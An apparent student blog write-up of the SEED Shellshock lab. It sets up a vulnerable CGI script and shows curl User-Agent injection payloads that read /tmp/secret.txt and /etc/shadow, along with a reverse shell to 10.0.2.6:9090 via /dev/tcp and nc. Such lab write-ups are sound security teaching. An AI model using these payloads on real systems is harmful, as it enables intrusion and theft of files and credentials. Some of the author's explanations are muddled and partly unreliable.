---
title: Shellshock
date: 2020-02-25 11:34:56
tags: [Security]
series: [blog]
featured: true
toc: true
comments: true
---

![](images/Shellshock/Platform-SEEDUbuntu16__04--32bit-green.svg)  ![](images/Shellshock/SEED-SoftwareSecurityLab-brightgreen.svg)

> This is report of SEED Lab report.

Table of Contents
=================

* [Task 1: Experimenting with Bash Function](#task-1-experimenting-with-bash-function)
* [Task 2: Setting up CGI programs](#task-2-setting-up-cgi-programs)
* [Task 3: Passing Data to Bash via Environment Variable](#task-3-passing-data-to-bash-via-environment-variable)
* [Task 4: Launching the Shellshock Attack](#task-4-launching-the-shellshock-attack)
* [Task 5: Getting a Reverse Shell via Shellshock Attack](#task-5-getting-a-reverse-shell-via-shellshock-attack)
* [Task 6: Using the Patched Bash](#task-6-using-the-patched-bash)


## Task 1: Experimenting with Bash Function

For this task, we need to run  a prepared shell (ubuntu16 has fixed this bug):

```shell
$ /bin/bash_shellshock
```

## Task 2: Setting up CGI programs

In this lab, we will launch a Shellshock attack on a remote web server. Many web servers enable CGI, which is a standard method used to generate dynamic content on Web pages and Web applications. Many CGI programs are written using shell scripts. Therefore, before a CGI program is executed, a shell program will  be invoked first, and such an invocation is triggered by a user from a remote computer. If the shell program is a vulnerable Bash program, we can exploit the Shellshock vulnerable to gain privileges on the server.

create `myproc.cgi`:

```shell
$ touch myprog.cgi
```

fill it with:

```shell
#!/bin/bash_shellshock 
echo "Content-type: text/plain"
echo
echo
echo "Hello World"
```

move it to `/usr/lib/cgi-bin` and set its permission to 755:

```shell
$ sudo chmod 755 myproc.cgi
```

## Task 3: Passing Data to Bash via Environment Variable

we can use `curl -A "info" url` to passing data to bash.

```shell
[02/25/20]seed@VM:.../cgi-bin$  curl -A "hello" http://localhost/cgi-bin/show.cgi
****** Environment Variables ******
HTTP_HOST=localhost
HTTP_USER_AGENT=hello
HTTP_ACCEPT=*/*
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
SERVER_SIGNATURE=<address>Apache/2.4.18 (Ubuntu) Server at localhost Port 80</address>
SERVER_SOFTWARE=Apache/2.4.18 (Ubuntu)
SERVER_NAME=localhost
SERVER_ADDR=127.0.0.1
SERVER_PORT=80
REMOTE_ADDR=127.0.0.1
DOCUMENT_ROOT=/var/www/html
REQUEST_SCHEME=http
CONTEXT_PREFIX=/cgi-bin/
CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/
SERVER_ADMIN=webmaster@localhost
SCRIPT_FILENAME=/usr/lib/cgi-bin/show.cgi
REMOTE_PORT=34124
GATEWAY_INTERFACE=CGI/1.1
SERVER_PROTOCOL=HTTP/1.1
REQUEST_METHOD=GET
QUERY_STRING=
REQUEST_URI=/cgi-bin/show.cgi
SCRIPT_NAME=/cgi-bin/show.cgi
[02/25/20]seed@VM:.../cgi-bin$ 
```

Then we can find that data “hello” has been sent to `HTTP_USER_AGENT`

## Task 4: Launching the Shellshock Attack

Our target is to leak the info in `/tmp/secret.txt`，which has been created manually before.

If we want to look up some info in a file locally, usually we will use “cat xxx” command.

So our solution is trying to send such command to server and let the server shell execute that command.

```shell
$ curl -A "() { echo hello; }; echo Content_type: text/plain; echo; /bin/cat
/tmp/secret.txt" http://localhost/cgi-bin/show.cgi
```

Here i have tried so many times but i don’t know why it cannot succeed. 

• Using the Shellshock attack to steal the content of a secret file from the server.

• Answer the following question: will you be able to steal the content of the shadow file `/etc/shadow`? Why or why not?

```shell
$ curl -A "() { echo hello; }; echo Content_type: text/plain; echo; /bin/cat /etc/shadow" http://localhost/cgi-bin/show.cgi
```

we cannot steal the content of the shadow file. Because Apache is running with a www-data account, and its cannot access `etc\shadow` of descriptor 620 . So our attack would fail.

## Task 5: Getting a Reverse Shell via Shellshock Attack

First, we need listen on the port 9090 (like the lab we have done before.)

```shell
$ nc -l 9090 -v
```

And then we need construct a malicious code:

```shell
$ curl -A "() { echo hello; }; echo Content_type: text/plain; echo; /bin/bash -i >
/dev/tcp/10.0.2.6/9090 0<&1 2>&1" http://localhost/cgi-bin/show.cgi
```

## Task 6: Using the Patched Bash



```shell
#!/bin/bash
echo "Content-type: text/plain"
echo
echo "****** Environment Variables ******"
strings /proc/$$/environ
```

Then we try to steal the contents.

```shell
$ curl -A "() { echo hello; }; echo Content_type: text/plain; echo; /bin/cat
/tmp/secret.txt" http://localhost/cgi-bin/task6.cgi
```

We will failed in a new bash.